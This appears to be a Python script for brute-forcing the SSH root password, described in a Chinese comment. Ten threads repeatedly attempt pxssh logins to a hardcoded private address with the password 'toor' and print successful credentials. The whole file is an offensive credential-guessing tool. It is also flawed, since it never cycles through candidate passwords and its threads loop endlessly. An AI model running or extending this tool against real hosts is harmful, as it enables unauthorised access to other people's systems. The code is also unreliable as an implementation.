#!/usr/bin/python3
# coding: utf-8
'''
暴力破解ssh，root用户的密码，线程池
'''
from pexpect import pxssh
from threading import *

mutex = Lock()

class CrackSSHWorkInfo:
  def __init__(self, host, password, user='root'):
    self._user = user
    self._host = host
    self._password = password
    
  def checkPassword(self):
    try:
      s = pxssh.pxssh()
      s.login(self._host, self._user, self._password)
    except Exception as e:
      print('[-] Login Fail..., ErrorInfo: {0}'.format(e))
      return False
    finally:
      s.logout()
    return True
  
  def getHost(self):
    return self._host

  def getPassword(self):
    return self._password
        

class CrackSSHThreadPool:
  def __init__(self, count):
    self._count = count
    pass

  def _getWorkInfo(self):
    return CrackSSHWorkInfo('192.168.240.122', 'toor')

  def startThreadPool(self):
    for i in range(self._count):
      t = Thread(target=self._workThread)
      t.start()

  def _saveSuccessInfo(self, workInfo):
    mutex.acquire()
    print('[+] save Success, host: {0}, password: {1}'.format(workInfo.getHost(), workInfo.getPassword()))
    mutex.release()

  def _workThread(self):
    while True:
      workInfo = self._getWorkInfo()
      if workInfo.checkPassword():
          self._saveSuccessInfo(workInfo)

if __name__ == '__main__':
  csPool = CrackSSHThreadPool(10)
  csPool.startThreadPool()

